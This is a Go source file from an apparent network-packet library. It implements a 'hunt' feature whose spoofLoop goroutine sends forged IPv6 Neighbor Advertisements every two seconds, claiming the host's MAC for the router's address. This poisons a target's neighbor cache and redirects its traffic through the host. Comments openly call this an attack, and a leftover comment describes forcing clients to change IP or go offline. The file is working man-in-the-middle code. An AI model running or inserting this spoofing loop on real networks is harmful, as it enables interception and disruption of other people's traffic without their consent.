package icmp6

import (
	"fmt"
	"time"

	"github.com/irai/packet"
)

// StartHunt implements packet processor interface
//
// Hunt IPv6 LLA only; return error if IP is not IP6 Local Link Address
func (h *Handler) StartHunt(addr packet.Addr) (packet.HuntStage, error) {
	if Debug {
		fmt.Printf("icmp6 : start neighbor hunt %s\n", addr)
	}
	h.Lock()
	if h.huntList.Index(addr.MAC) != -1 {
		h.Unlock()
		return packet.StageHunt, nil
	}
	h.huntList.Add(addr)
	h.Unlock()

	go h.spoofLoop(addr)

	return packet.StageHunt, nil
}

// StopHunt implements PacketProcessor interface
func (h *Handler) StopHunt(addr packet.Addr) (packet.HuntStage, error) {
	if Debug {
		fmt.Printf("icmp6 : stop neighbor hunt %s\n", addr)
	}
	h.Lock()
	defer h.Unlock()

	h.huntList.Del(addr)
	return packet.StageNormal, nil
}

// spoofLoop attacks the client with ARP attacks
//
// It will continuously send a number of ARP packets to client:
//   1. spoof the client arp table to send router packets to us
//   2. optionally, claim the ownership of the IP to force client to change IP or go offline
//
func (h *Handler) spoofLoop(dstAddr packet.Addr) {
	startTime := time.Now()
	nTimes := 0
	if dstAddr.IP == nil {
		dstAddr.IP = packet.IP6AllNodesMulticast
	}
	fmt.Printf("icmp6 : na attack %s time=%v\n", dstAddr, startTime)
	for {
		h.Lock()

		if h.huntList.Index(dstAddr.MAC) == -1 || h.closed {
			h.Unlock()
			fmt.Printf("icmp6 : attack end %s repeat=%v duration=%v\n", dstAddr, nTimes, time.Since(startTime))
			return
		}

		// Attack when we have the router LLA only
		if h.Router != nil {
			list := []packet.Addr{}
			for _, router := range h.LANRouters {
				list = append(list, router.Addr)
			}

			h.Unlock()

			for _, routerAddr := range list {
				hostAddr := packet.Addr{MAC: h.session.NICInfo.HostMAC, IP: h.session.NICInfo.HostLLA.IP}
				targetAddr := packet.Addr{MAC: h.session.NICInfo.HostMAC, IP: routerAddr.IP}
				fakeRouter := packet.Addr{MAC: hostAddr.MAC, IP: routerAddr.IP}

				if err := h.SendNeighborAdvertisement(fakeRouter, dstAddr, targetAddr); err != nil {
					fmt.Println("icmp6 : error sending na ", err)
				}

				/* no need to send this - May 21
				if err := h.SendNeighbourSolicitation(fakeRouter, dst, dstAddr.IP); err != nil {
					fmt.Println("icmp6 : error sending na ", err)
				}
				*/

				if nTimes%16 == 0 {
					fmt.Printf("icmp6 : attack src %s dst %s target %s repeat=%v duration=%v\n", hostAddr, dstAddr, targetAddr, nTimes, time.Since(startTime))
				}
				nTimes++

				/**
					// spoof router
					if !dstAddr.IP.Equal(packet.IP6AllNodesMulticast) { // dont spoof router if we don't know the IPv6
					targetAddr.IP = dstAddr.IP
					if err := h.SendNeighborAdvertisement(host, routerAddr, targetAddr); err != nil {
						fmt.Println("icmp6 : error sending na ", err)
					}
				}
				*/
			}
		} else {
			h.Unlock()
			if nTimes%64 == 0 {
				fmt.Printf("icmp6 : na attack failed - missing router LLA %s\n", dstAddr)
			}
			nTimes++
		}

		select {
		case <-h.closeChan:
			// Tplink home router send RA every 3 seconds
			// Note: when processing a RA message, we close the channel to wakeup all go routines

		case <-time.After(time.Second * 2):
			// 2 second spoof seem to be adequate to keep cache poisoned
		}
	}
}
